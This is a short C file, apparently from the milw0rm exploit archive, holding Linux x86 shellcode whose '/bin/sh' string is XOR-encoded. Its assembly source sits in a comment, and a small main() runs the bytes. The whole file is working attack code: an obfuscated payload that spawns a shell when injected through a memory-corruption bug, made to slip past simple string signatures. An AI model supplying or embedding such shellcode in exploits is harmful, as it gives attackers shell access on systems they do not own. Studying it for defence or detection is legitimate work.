/*
.file "xor-encrypted shellcode"
.version "1.0"
.text
	.align 4
.globl main
	.type main,@function
_start:
	xorl	%eax,%eax
	jmp    	0x22
	popl   	%ebx
	movl	8(%ebx),%edx
	xor	%edx,(%ebx)
	xor	%edx,4(%ebx)
	xor	%edx,%edx
	movl   	%ebx,0x8(%esp)
	movl   	%edx,0xc(%esp)
	movb   	$0xb,%al
	leal   	0x8(%esp),%ecx
	int    	$0x80
	xorl   	%ebx,%ebx
	movl   	%ebx,%eax
	incl   	%eax
	int   	$0x80
	call	-0x27
	.string "\x6e\x23\x28\x2f\x6e\x32\x29\x41\x41\x41\x41\x41"
*/

#define NAME "encrypted"

char code[]=
"\x31\xc0\xeb\x22\x5b\x8b\x53\x08\x31\x13\x31\x53\x04\x31\xd2\x89"
"\x5c\x24\x08\x89\x54\x24\x0c\xb0\x0b\x8d\x4c\x24\x08\xcd\x80\x31"
"\xdb\x89\xd8\x40\xcd\x80\xe8\xd9\xff\xff\xff"
"\x6e\x23\x28\x2f\x6e\x32\x29\x41" /* encrypted "/bin/sh" */
"\x41\x41\x41\x41";     /* Conversion chars */

main()
{
  int (*funct)();
  funct = (int (*)()) code;
  printf("%s shellcode\n\tSize = %d\n",NAME,strlen(code));
  (int)(*funct)();
}

// milw0rm.com [2004-09-12]